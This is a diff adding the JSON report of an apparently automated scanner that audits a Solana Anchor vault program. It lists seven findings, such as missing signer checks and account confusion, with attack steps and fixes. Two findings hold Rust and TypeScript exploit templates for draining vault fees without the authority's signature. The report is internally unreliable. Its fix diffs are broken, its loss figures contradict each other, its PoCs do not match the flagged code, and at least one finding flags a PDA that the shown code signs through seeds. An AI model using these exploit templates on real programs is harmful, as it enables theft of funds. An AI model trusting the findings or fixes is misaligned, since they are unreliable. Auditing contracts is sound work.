@@ -1,0 +1,461 @@
+  + Phase timing:
+    Initialization: 23ms
+    Vulnerability scan: 6659ms
+    Total findings (pre-filter): 7
+[
+  {
+    "attack_scenario": "Attacker passes their own pubkey as `base_vault_authority`. Since there is no signer constraint, the runtime accepts the instruction and the attacker executes privileged operations.",
+    "category": "Authentication",
+    "confidence": 81,
+    "cwe": "CWE-287",
+    "description": "Field `base_vault_authority` in `WithdrawPendingFees` uses raw `AccountInfo<'info>` without `Signer<'info>` or `#[account(signer)]`. Any pubkey can be passed as this account — the Solana runtime will NOT enforce signing. This allows unauthorized access to privileged operations. [found in 8 locations; also in: handler_withdraw.rs:WithdrawFromInvested, handler_update_reserve_allocation.rs:UpdateReserveAllocation, handler_update_metadata.rs:UpdateSharesMetadata, handler_invest.rs:Invest, handler_initialize_shares_metadata.rs:InitializeSharesMetadata, handler_init_vault.rs:InitVault, handler_deposit.rs:Deposit]",
+    "fix": {
+      "diff": "- pub base_vault_authority: AccountInfo<'info>,\n+ #[derive(Accounts)]",
+      "explanation": "Apply the 'Signer Validation' pattern: Validates account is a signer",
+      "fixed_code": "\n#[derive(Accounts)]\npub struct SecureAccounts<'info> {\n    #[account(mut)]\n    pub authority: Signer<'info>,\n    // ... other accounts\n}\n",
+      "original_code": "pub base_vault_authority: AccountInfo<'info>,",
+      "vulnerability_id": "SOL-001"
+    },
+    "function_name": "WithdrawPendingFees",
+    "id": "SOL-001",
+    "line_number": 182,
+    "location": "handler_withdraw_pending_fees.rs",
+    "poc": {
+      "attack_steps": [
+        {
+          "action_type": "Setup",
+          "code_snippet": "pub base_vault_authority: AccountInfo<'info>,",
+          "description": "Identify the vulnerable instruction that doesn't verify signer",
+          "step_number": 1
+        },
+        {
+          "action_type": "Transaction",
+          "code_snippet": null,
+          "description": "Craft transaction with victim's authority but without their signature",
+          "step_number": 2
+        },
+        {
+          "action_type": "Exploitation",
+          "code_snippet": null,
+          "description": "Submit transaction - only attacker signs",
+          "step_number": 3
+        },
+        {
+          "action_type": "Extraction",
+          "code_snippet": null,
+          "description": "Funds transferred to attacker's account",
+          "step_number": 4
+        }
+      ],
+      "difficulty": "Trivial",
+      "economic_impact": "CRITICAL - Complete vault/account drainage possible",
+      "expected_outcome": "Attacker can perform actions on behalf of any authority without their consent",
+      "mitigations": [
+        "Add Signer<'info> constraint to authority account",
+        "Use #[account(signer)] macro for Anchor programs",
+        "Verify ctx.accounts.authority.is_signer in handler"
+      ],
+      "prerequisites": [
+        "Knowledge of victim's public key",
+        "Program ID and IDL"
+      ],
+      "rust_poc": "// Rust PoC for SOL-001: Missing Signer Check\nuse solana_sdk::{\n    instruction::{AccountMeta, Instruction},\n    pubkey::Pubkey,\n    signature::Keypair,\n    signer::Signer,\n    transaction::Transaction,\n};\n\npub fn exploit_missing_signer(\n    program_id: &Pubkey,\n    victim_authority: &Pubkey,\n    attacker: &Keypair,\n    vault: &Pubkey,\n) -> Instruction {\n    // Craft instruction with victim's authority but without their signature\n    Instruction {\n        program_id: *program_id,\n        accounts: vec![\n            AccountMeta::new(*vault, false),       // Vault (writable)\n            AccountMeta::new_readonly(*victim_authority, false), // Authority (NOT signer!)\n            AccountMeta::new(attacker.pubkey(), true), // Attacker's account\n        ],\n        data: vec![/* WithdrawPendingFees instruction discriminator + withdraw amount */],\n    }\n}",
+      "scenario_name": "SOL-001: Missing Signer Check in WithdrawPendingFees",
+      "typescript_poc": "import * as anchor from \"@coral-xyz/anchor\";\nimport { expect } from \"chai\";\n\ndescribe(\"SOL-001 Exploit: Missing Signer Check\", () => {\n  const provider = anchor.AnchorProvider.env();\n  anchor.setProvider(provider);\n  \n  it(\"allows unauthorized action without proper signer\", async () => {\n    const attacker = anchor.web3.Keypair.generate();\n    const victim = anchor.web3.Keypair.generate();\n    \n    // Airdrop SOL to attacker\n    await provider.connection.requestAirdrop(\n      attacker.publicKey,\n      anchor.web3.LAMPORTS_PER_SOL\n    );\n    \n    // Setup: Victim deposits funds\n    const victimVault = anchor.web3.Keypair.generate();\n    // ... initialize vault with victim's funds ...\n    \n    // EXPLOIT: Attacker calls WithdrawPendingFees without being the authority signer\n    const tx = await program.methods\n      .WithdrawPendingFees(new anchor.BN(1_000_000_000)) // Drain amount\n      .accounts({\n        vault: victimVault.publicKey,\n        authority: victim.publicKey, // Victim's authority (NOT signing!)\n        destination: attacker.publicKey,\n        systemProgram: anchor.web3.SystemProgram.programId,\n      })\n      .signers([attacker]) // Only attacker signs, not victim!\n      .rpc();\n    \n    console.log(\"Exploit TX:\", tx);\n    \n    // Verify: Funds were stolen\n    const attackerBalance = await provider.connection.getBalance(attacker.publicKey);\n    expect(attackerBalance).to.be.greaterThan(anchor.web3.LAMPORTS_PER_SOL);\n  });\n});",
+      "vulnerability_id": "SOL-001"
+    },
+    "prevention": "Always use Signer<'info> for authority accounts.",
+    "real_world_incident": {
+      "date": "2022-02-02",
+      "loss": "$320M",
+      "project": "Wormhole"
+    },
+    "secure_fix": "Change `pub base_vault_authority: AccountInfo<'info>` to `pub base_vault_authority: Signer<'info>`, or add `#[account(signer)]`.",
+    "severity": 5,
+    "severity_label": "CRITICAL",
+    "simulation": {
+      "rpc": "https://api.devnet.solana.com",
+      "simulate_only": true,
+      "status": "simulated",
+      "summary": "Simulated MissingSignerCheck exploit for SOL-001 (Missing Signer Check). Config: RPC=https://api.devnet.solana.com, simulate_only=true, compute_budget=200000"
+    },
+    "vuln_type": "Missing Signer Check",
+    "vulnerable_code": "pub base_vault_authority: AccountInfo<'info>,"
+  },
+  {
+    "attack_scenario": "",
+    "category": "Type Safety",
+    "confidence": 71,
+    "cwe": "CWE-345",
+    "description": "Raw `AccountInfo<'info>` field 'lending_market' in 'withdraw_from_invested' has no `/// CHECK:` documentation and no Anchor constraints. Anchor will not validate the account type, owner, or data layout — any account can be substituted. This is the primary vector for account confusion attacks (Cashio $48M exploit, Wormhole $320M exploit).",
+    "function_name": "withdraw_from_invested",
+    "id": "SOL-076",
+    "line_number": 93,
+    "location": "handlers/handler_withdraw.rs",
+    "poc": {
+      "attack_steps": [
+        {
+          "action_type": "Setup",
+          "code_snippet": "92: \n93:     pub lending_market: AccountInfo<'info>,\n94:     pub lending_market_authority: AccountInfo<'info>,",
+          "description": "Analyze vulnerable function: withdraw_from_invested",
+          "step_number": 1
+        },
+        {
+          "action_type": "Transaction",
+          "code_snippet": null,
+          "description": "Construct malicious transaction",
+          "step_number": 2
+        },
+        {
+          "action_type": "Exploitation",
+          "code_snippet": null,
+          "description": "Execute exploit and extract value",
+          "step_number": 3
+        }
+      ],
+      "difficulty": "Trivial",
+      "economic_impact": "CRITICAL - Severe financial impact",
+      "expected_outcome": "Vulnerability exploited: Raw `AccountInfo<'info>` field 'lending_market' in 'withdraw_from_invested' has no `/// CHECK:` documentation and no Anchor constraints. Anchor will not validate the account type, owner, or data layout — any account can be substituted. This is the primary vector for account confusion attacks (Cashio $48M exploit, Wormhole $320M exploit).",
+      "mitigations": [
+        ""
+      ],
+      "prerequisites": [
+        "Access to handlers/handler_withdraw.rs"
+      ],
+      "rust_poc": null,
+      "scenario_name": "SOL-076: Account Type Confusion",
+      "typescript_poc": null,
+      "vulnerability_id": "SOL-076"
+    },
+    "prevention": "",
+    "real_world_incident": null,
+    "secure_fix": "Replace `AccountInfo<'info>` with a typed Anchor wrapper:\n• `Account<'info, MyData>` — validates owner + deserializes data\n• `Program<'info, MyProgram>` — validates program ID\n• `Signer<'info>` — validates is_signer flag\n• `SystemAccount<'info>` — validates System Program ownership\nIf raw access is truly needed, add `/// CHECK: <justification>` documenting why this is safe.",
+    "severity": 5,
+    "severity_label": "Critical",
+    "simulation": {
+      "rpc": "https://api.devnet.solana.com",
+      "simulate_only": true,
+      "status": "simulated",
+      "summary": "Simulated AccountConfusion exploit for SOL-076 (Account Type Confusion). Config: RPC=https://api.devnet.solana.com, simulate_only=true, compute_budget=200000"
+    },
+    "vuln_type": "Account Type Confusion",
+    "vulnerable_code": "92: \n93:     pub lending_market: AccountInfo<'info>,\n94:     pub lending_market_authority: AccountInfo<'info>,"
+  },
+  {
+    "attack_scenario": "Attacker reads the authority pubkey from the program's state, then passes that pubkey as the authority account without signing the transaction with the corresponding private key.",
+    "category": "Authorization",
+    "confidence": 64,
+    "cwe": "CWE-862",
+    "description": "Account `lending_market_authority` in `WithdrawFromInvested` has an authority-like name but is not marked as a signer and no companion signer validates it. An attacker can pass any account as the authority without proving ownership. [found in 3 locations; also in: handler_update_metadata.rs:UpdateSharesMetadata, handler_init_vault.rs:InitVault]",
+    "function_name": "WithdrawFromInvested",
+    "id": "SOL-ALIAS-05",
+    "line_number": 94,
+    "location": "handler_withdraw.rs",
+    "poc": {
+      "attack_steps": [
+        {
+          "action_type": "Setup",
+          "code_snippet": "pub lending_market_authority: AccountInfo<'info>",
+          "description": "Analyze vulnerable function: WithdrawFromInvested",
+          "step_number": 1
+        },
+        {
+          "action_type": "Transaction",
+          "code_snippet": null,
+          "description": "Construct malicious transaction",
+          "step_number": 2
+        },
+        {
+          "action_type": "Exploitation",
+          "code_snippet": null,
+          "description": "Execute exploit and extract value",
+          "step_number": 3
+        }
+      ],
+      "difficulty": "Trivial",
+      "economic_impact": "CRITICAL - Severe financial impact",
+      "expected_outcome": "Vulnerability exploited: Account `lending_market_authority` in `WithdrawFromInvested` has an authority-like name but is not marked as a signer and no companion signer validates it. An attacker can pass any account as the authority without proving ownership. [found in 3 locations; also in: handler_update_metadata.rs:UpdateSharesMetadata, handler_init_vault.rs:InitVault]",
+      "mitigations": [
+        "Always require signer verification for authority accounts."
+      ],
+      "prerequisites": [
+        "Access to handler_withdraw.rs"
+      ],
+      "rust_poc": null,
+      "scenario_name": "SOL-ALIAS-05: Authority Account Without Signer Check",
+      "typescript_poc": null,
+      "vulnerability_id": "SOL-ALIAS-05"
+    },
+    "prevention": "Always require signer verification for authority accounts.",
+    "real_world_incident": {
+      "date": "2022-02-02",
+      "loss": "$320M",
+      "project": "Wormhole Bridge"
+    },
+    "secure_fix": "Add `Signer<'info>` type or `#[account(signer)]` constraint.",
+    "severity": 5,
+    "severity_label": "CRITICAL",
+    "simulation": {
+      "rpc": "https://api.devnet.solana.com",
+      "simulate_only": true,
+      "status": "simulated",
+      "summary": "Simulated AccountConfusion exploit for SOL-ALIAS-05 (Authority Account Without Signer Check). Config: RPC=https://api.devnet.solana.com, simulate_only=true, compute_budget=200000"
+    },
+    "vuln_type": "Authority Account Without Signer Check",
+    "vulnerable_code": "pub lending_market_authority: AccountInfo<'info>"
+  },
+  {
+    "attack_scenario": "Attacker provides malformed data that crashes or exploits the program.",
+    "category": "Data Validation",
+    "confidence": 61,
+    "cwe": "CWE-502",
+    "description": "Unsafe deserialization can read garbage data or cause undefined behavior.",
+    "function_name": "cpi_deposit_reserve_liquidity",
+    "id": "SOL-014",
+    "line_number": 59,
+    "location": "klend_operations.rs",
+    "poc": {
+      "attack_steps": [
+        {
+          "action_type": "Setup",
+          "code_snippet": "pub fn cpi_deposit_reserve_liquidity (ctx : & Context<Invest > , cpi : & mut CpiMemoryLender , base_vault_authority_bump : u8 , liquidity_amount : u64 ,) -> Result<() > { let accs = kamino_lending :: accounts :: DepositReserveLiquidity { owner : ctx . accounts . base_vault_authority . key () , reserve : ctx . accounts . reserve . key () , lending_market : ctx . accounts . lending_market . key () , lending_market_authority : ctx . accounts . lending_market_authority . key () , reserve_liquidity_mint : ctx . accounts . token_mint . key () , reserve_liquidity_supply : ctx . accounts . reserve_liquidity_supply . key () , reserve_collateral_mint : ctx . accounts . reserve_collateral_mint . key () , user_source_liquidity : ctx . accounts . token_vault . key () , user_destination_collateral : ctx . accounts . ctoken_vault . key () , collateral_token_program : ctx . accounts . reserve_collateral_token_program . key () , liquidity_token_program : ctx . accounts . token_program . key () , instruction_sysvar_account : ctx . accounts . instruction_sysvar_account . key () , } . to_account_metas (None) ; let mut data = [0_u8 ; 40] ; data [0 .. 8] . copy_from_slice (& kamino_lending :: instruction :: DepositReserveLiquidity :: DISCRIMINATOR) ; let mut writer = & mut data [8 .. 40] ; borsh :: to_writer (& mut writer , & liquidity_amount) . unwrap () ; let base_vault_authority_bump = vec ! [base_vault_authority_bump] ; let vault_state_key = ctx . accounts . vault_state . key () ; let inner_seeds = [BASE_VAULT_AUTHORITY_SEED , vault_state_key . as_ref () , base_vault_authority_bump . as_ref () ,] ; let signer_seeds = & [& inner_seeds [..]] ; cpi . program_invoke_signed (& ctx . accounts . klend_program . key () , & accs , & data , signer_seeds ,) . map_err (Into :: into) }",
+          "description": "Analyze vulnerable function: cpi_deposit_reserve_liquidity",
+          "step_number": 1
+        },
+        {
+          "action_type": "Transaction",
+          "code_snippet": null,
+          "description": "Construct malicious transaction",
+          "step_number": 2
+        },
+        {
+          "action_type": "Exploitation",
+          "code_snippet": null,
+          "description": "Execute exploit and extract value",
+          "step_number": 3
+        }
+      ],
+      "difficulty": "Easy",
+      "economic_impact": "HIGH - Significant financial impact",
+      "expected_outcome": "Vulnerability exploited: Unsafe deserialization can read garbage data or cause undefined behavior.",
+      "mitigations": [
+        "Always validate data length and format before deserializing"
+      ],
+      "prerequisites": [
+        "Access to klend_operations.rs"
+      ],
+      "rust_poc": null,
+      "scenario_name": "SOL-014: Unsafe Deserialization",
+      "typescript_poc": null,
+      "vulnerability_id": "SOL-014"
+    },
+    "prevention": "Always validate data length and format before deserializing",
+    "real_world_incident": null,
+    "secure_fix": "Use try_from_slice with proper error handling",
+    "severity": 4,
+    "severity_label": "HIGH",
+    "simulation": {
+      "rpc": "https://api.devnet.solana.com",
+      "simulate_only": true,
+      "status": "simulated",
+      "summary": "Simulated AccountConfusion exploit for SOL-014 (Unsafe Deserialization). Config: RPC=https://api.devnet.solana.com, simulate_only=true, compute_budget=200000"
+    },
+    "vuln_type": "Unsafe Deserialization",
+    "vulnerable_code": "pub fn cpi_deposit_reserve_liquidity (ctx : & Context<Invest > , cpi : & mut CpiMemoryLender , base_vault_authority_bump : u8 , liquidity_amount : u64 ,) -> Result<() > { let accs = kamino_lending :: accounts :: DepositReserveLiquidity { owner : ctx . accounts . base_vault_authority . key () , reserve : ctx . accounts . reserve . key () , lending_market : ctx . accounts . lending_market . key () , lending_market_authority : ctx . accounts . lending_market_authority . key () , reserve_liquidity_mint : ctx . accounts . token_mint . key () , reserve_liquidity_supply : ctx . accounts . reserve_liquidity_supply . key () , reserve_collateral_mint : ctx . accounts . reserve_collateral_mint . key () , user_source_liquidity : ctx . accounts . token_vault . key () , user_destination_collateral : ctx . accounts . ctoken_vault . key () , collateral_token_program : ctx . accounts . reserve_collateral_token_program . key () , liquidity_token_program : ctx . accounts . token_program . key () , instruction_sysvar_account : ctx . accounts . instruction_sysvar_account . key () , } . to_account_metas (None) ; let mut data = [0_u8 ; 40] ; data [0 .. 8] . copy_from_slice (& kamino_lending :: instruction :: DepositReserveLiquidity :: DISCRIMINATOR) ; let mut writer = & mut data [8 .. 40] ; borsh :: to_writer (& mut writer , & liquidity_amount) . unwrap () ; let base_vault_authority_bump = vec ! [base_vault_authority_bump] ; let vault_state_key = ctx . accounts . vault_state . key () ; let inner_seeds = [BASE_VAULT_AUTHORITY_SEED , vault_state_key . as_ref () , base_vault_authority_bump . as_ref () ,] ; let signer_seeds = & [& inner_seeds [..]] ; cpi . program_invoke_signed (& ctx . accounts . klend_program . key () , & accs , & data , signer_seeds ,) . map_err (Into :: into) }"
+  },
+  {
+    "attack_scenario": "Program reads remaining_accounts[0] as a user's token account without checking owner. Attacker passes a token account they own, redirecting funds or spoofing identity.",
+    "category": "Account Validation",
+    "confidence": 61,
+    "cwe": "CWE-20",
+    "description": "The context uses `remaining_accounts` without validating the accounts' ownership, signer status, or expected keys. These accounts bypass Anchor's automatic validation, so ANY account can be passed. [found in 4 locations; also in: handler_invest.rs:process, handler_give_up_pending_fees.rs:process, handler_deposit.rs:process]",
+    "function_name": "withdraw",
+    "id": "SOL-063",
+    "line_number": 25,
+    "location": "handler_withdraw.rs",
+    "poc": {
+      "attack_steps": [
+        {
+          "action_type": "Setup",
+          "code_snippet": "pub fn withdraw < 'info> (ctx : Context<'_ , '_ , '_ , 'info, Withdraw < 'info> > , shares_amount : u64 ,) -> Result<() > { let withdraw_from_available = & ctx . accounts . withdraw_from_available ; let withdraw_from_reserve = & ctx . accounts . withdraw_from_reserve_accounts ; require_keys_eq ! (withdraw_from_available . vault_state . key () , withdraw_from_reserve . vault_state . key ()) ; let (shares_to_withdraw_event , withdraw_result_event) = withdraw_utils :: withdraw (withdraw_from_available , Some (withdraw_from_reserve) , ctx . remaining_accounts , shares_amount ,) ? ; emit_cpi ! (shares_to_withdraw_event) ; emit_cpi ! (withdraw_result_event) ; Ok (()) }",
+          "description": "Analyze vulnerable function: withdraw",
+          "step_number": 1
+        },
+        {
+          "action_type": "Transaction",
+          "code_snippet": null,
+          "description": "Construct malicious transaction",
+          "step_number": 2
+        },
+        {
+          "action_type": "Exploitation",
+          "code_snippet": null,
+          "description": "Execute exploit and extract value",
+          "step_number": 3
+        }
+      ],
+      "difficulty": "Easy",
+      "economic_impact": "HIGH - Significant financial impact",
+      "expected_outcome": "Vulnerability exploited: The context uses `remaining_accounts` without validating the accounts' ownership, signer status, or expected keys. These accounts bypass Anchor's automatic validation, so ANY account can be passed. [found in 4 locations; also in: handler_invest.rs:process, handler_give_up_pending_fees.rs:process, handler_deposit.rs:process]",
+      "mitigations": [
+        "Minimize remaining_accounts usage. When required, validate each account's owner, key, and writable/signer constraints explicitly."
+      ],
+      "prerequisites": [
+        "Access to handler_withdraw.rs"
+      ],
+      "rust_poc": null,
+      "scenario_name": "SOL-063: Unvalidated remaining_accounts",
+      "typescript_poc": null,
+      "vulnerability_id": "SOL-063"
+    },
+    "prevention": "Minimize remaining_accounts usage. When required, validate each account's owner, key, and writable/signer constraints explicitly.",
+    "real_world_incident": null,
+    "secure_fix": "Validate each remaining_account: check owner, key, signer status. Prefer typed accounts in the Accounts struct over remaining_accounts.",
+    "severity": 4,
+    "severity_label": "HIGH",
+    "simulation": {
+      "rpc": "https://api.devnet.solana.com",
+      "simulate_only": true,
+      "status": "simulated",
+      "summary": "Simulated AccountConfusion exploit for SOL-063 (Unvalidated remaining_accounts). Config: RPC=https://api.devnet.solana.com, simulate_only=true, compute_budget=200000"
+    },
+    "vuln_type": "Unvalidated remaining_accounts",
+    "vulnerable_code": "pub fn withdraw < 'info> (ctx : Context<'_ , '_ , '_ , 'info, Withdraw < 'info> > , shares_amount : u64 ,) -> Result<() > { let withdraw_from_available = & ctx . accounts . withdraw_from_available ; let withdraw_from_reserve = & ctx . accounts . withdraw_from_reserve_accounts ; require_keys_eq ! (withdraw_from_available . vault_state . key () , withdraw_from_reserve . vault_state . key ()) ; let (shares_to_withdraw_event , withdraw_result_event) = withdraw_utils :: withdraw (withdraw_from_available , Some (withdraw_from_reserve) , ctx . remaining_accounts , shares_amount ,) ? ; emit_cpi ! (shares_to_withdraw_event) ; emit_cpi ! (withdraw_result_event) ; Ok (()) }"
+  },
+  {
+    "attack_scenario": "Attacker creates an account with crafted data that mimics the expected layout. Without discriminator checking, the program interprets this data as valid, leading to unauthorized operations.",
+    "category": "Account Safety",
+    "confidence": 59,
+    "cwe": "CWE-704",
+    "description": "Account `accounts_infos` in `CpiMemoryLender` uses raw `AccountInfo` which provides no type safety or discriminator checking. The account data can contain anything — including data from a completely different program. [found in 4 locations; also in: handler_withdraw_pending_fees.rs:WithdrawPendingFees, handler_withdraw.rs:WithdrawFromInvested, handler_update_metadata.rs:UpdateSharesMetadata]",
+    "function_name": "CpiMemoryLender",
+    "id": "SOL-ALIAS-02",
+    "line_number": 19,
+    "location": "cpi_mem.rs",
+    "poc": {
+      "attack_steps": [
+        {
+          "action_type": "Setup",
+          "code_snippet": "pub accounts_infos: AccountInfo<'info>",
+          "description": "Analyze vulnerable function: CpiMemoryLender",
+          "step_number": 1
+        },
+        {
+          "action_type": "Transaction",
+          "code_snippet": null,
+          "description": "Construct malicious transaction",
+          "step_number": 2
+        },
+        {
+          "action_type": "Exploitation",
+          "code_snippet": null,
+          "description": "Execute exploit and extract value",
+          "step_number": 3
+        }
+      ],
+      "difficulty": "Easy",
+      "economic_impact": "HIGH - Significant financial impact",
+      "expected_outcome": "Vulnerability exploited: Account `accounts_infos` in `CpiMemoryLender` uses raw `AccountInfo` which provides no type safety or discriminator checking. The account data can contain anything — including data from a completely different program. [found in 4 locations; also in: handler_withdraw_pending_fees.rs:WithdrawPendingFees, handler_withdraw.rs:WithdrawFromInvested, handler_update_metadata.rs:UpdateSharesMetadata]",
+      "mitigations": [
+        "Always use typed accounts with discriminator validation."
+      ],
+      "prerequisites": [
+        "Access to cpi_mem.rs"
+      ],
+      "rust_poc": null,
+      "scenario_name": "SOL-ALIAS-02: Raw AccountInfo Without Type Safety",
+      "typescript_poc": null,
+      "vulnerability_id": "SOL-ALIAS-02"
+    },
+    "prevention": "Always use typed accounts with discriminator validation.",
+    "real_world_incident": {
+      "date": "2022-02-02",
+      "loss": "$320M",
+      "project": "Wormhole Bridge"
+    },
+    "secure_fix": "Replace `AccountInfo` with a typed Anchor account: `Account<'info, YourType>` which automatically validates the discriminator and owner.",
+    "severity": 4,
+    "severity_label": "HIGH",
+    "simulation": {
+      "rpc": "https://api.devnet.solana.com",
+      "simulate_only": true,
+      "status": "simulated",
+      "summary": "Simulated AccountConfusion exploit for SOL-ALIAS-02 (Raw AccountInfo Without Type Safety). Config: RPC=https://api.devnet.solana.com, simulate_only=true, compute_budget=200000"
+    },
+    "vuln_type": "Raw AccountInfo Without Type Safety",
+    "vulnerable_code": "pub accounts_infos: AccountInfo<'info>"
+  },
+  {
+    "attack_scenario": "Attacker creates a fake account with the same discriminator as the expected type but different data. Since `token_vault` has no ownership check, the instruction processes the attacker's account instead.",
+    "category": "Authorization",
+    "confidence": 56,
+    "cwe": "CWE-284",
+    "description": "Field `token_vault` in `WithdrawPendingFees` is a data account (`Account<'info, T>`) without `has_one`, `constraint`, or `owner` validation. An attacker can substitute a different account of the same type (type cosplay) to manipulate account state. [found in 7 locations; also in: handler_withdraw.rs:WithdrawFromInvested, handler_update_reserve_allocation.rs:UpdateReserveAllocation, handler_invest.rs:Invest, handler_initialize_shares_metadata.rs:InitializeSharesMetadata, handler_init_vault.rs:InitVault, handler_deposit.rs:Deposit]",
+    "fix": {
+      "diff": "- pub token_vault: Box<InterfaceAccount<'info, TokenAccount>>,\n+ #[derive(Accounts)]",
+      "explanation": "Apply the 'Owner Validation' pattern: Validates account owner",
+      "fixed_code": "\n#[derive(Accounts)]\npub struct SecureAccounts<'info> {\n    #[account(\n        constraint = my_account.owner == expected_program_id @ ErrorCode::InvalidOwner\n    )]\n    pub my_account: Account<'info, MyData>,\n}\n",
+      "original_code": "pub token_vault: Box<InterfaceAccount<'info, TokenAccount>>,",
+      "vulnerability_id": "SOL-003"
+    },
+    "function_name": "WithdrawPendingFees",
+    "id": "SOL-003",
+    "line_number": 170,
+    "location": "handler_withdraw_pending_fees.rs",
+    "poc": {
+      "attack_steps": [
+        {
+          "action_type": "Setup",
+          "code_snippet": null,
+          "description": "Create account with same data layout as expected account",
+          "step_number": 1
+        },
+        {
+          "action_type": "StateManipulation",
+          "code_snippet": null,
+          "description": "Initialize with malicious data (e.g., attacker as authority)",
+          "step_number": 2
+        },
+        {
+          "action_type": "Exploitation",
+          "code_snippet": null,
+          "description": "Pass fake account to vulnerable instruction",
+          "step_number": 3
+        }
+      ],
+      "difficulty": "Medium",
+      "economic_impact": "CRITICAL - Complete authority bypass possible",
+      "expected_outcome": "Program processes fake account, leading to unauthorized actions",
+      "mitigations": [
+        "Add owner = program_id constraint in Anchor",
+        "Verify account.owner == expected_program_id",
+        "Use Account<'info, T> for typed account access"
+      ],
+      "prerequisites": [
+        "Deploy malicious program with matching account structure",
+        "Initialize account with crafted data"
+      ],
+      "rust_poc": null,
+      "scenario_name": "SOL-003: Missing Owner Check in WithdrawPendingFees",
+      "typescript_poc": "import * as anchor from \"@coral-xyz/anchor\";\n\ndescribe(\"SOL-003 Exploit: Missing Owner Check\", () => {\n  it(\"substitutes fake account owned by attacker\", async () => {\n    // 1. Create a fake account with same data structure\n    const fakeAccount = anchor.web3.Keypair.generate();\n    \n    // 2. Initialize fake account with malicious data\n    // The fake account mimics a legitimate vault but is owned by attacker's program\n    \n    // 3. Call target instruction with fake account\n    const tx = await program.methods\n      .WithdrawPendingFees()\n      .accounts({\n        vault: fakeAccount.publicKey, // Fake account instead of real vault\n        // ... other accounts\n      })\n      .rpc();\n    \n    // Attack succeeds because program didn't verify account owner\n  });\n});",
+      "vulnerability_id": "SOL-003"
+    },
+    "prevention": "All data accounts must validate ownership via has_one or constraint.",
+    "real_world_incident": {
+      "date": "2022-03-23",
+      "loss": "$52M",
+      "project": "Cashio"
+    },
+    "secure_fix": "Add `#[account(has_one = authority @ ErrorCode::Unauthorized)]` to the `token_vault` field.",
+    "severity": 4,
+    "severity_label": "HIGH",
+    "simulation": {
+      "rpc": "https://api.devnet.solana.com",
+      "simulate_only": true,
+      "status": "simulated",
+      "summary": "Simulated AccountConfusion exploit for SOL-003 (Missing Owner/Authority Validation). Config: RPC=https://api.devnet.solana.com, simulate_only=true, compute_budget=200000"
+    },
+    "vuln_type": "Missing Owner/Authority Validation",
+    "vulnerable_code": "pub token_vault: Box<InterfaceAccount<'info, TokenAccount>>,"
+  }
+]
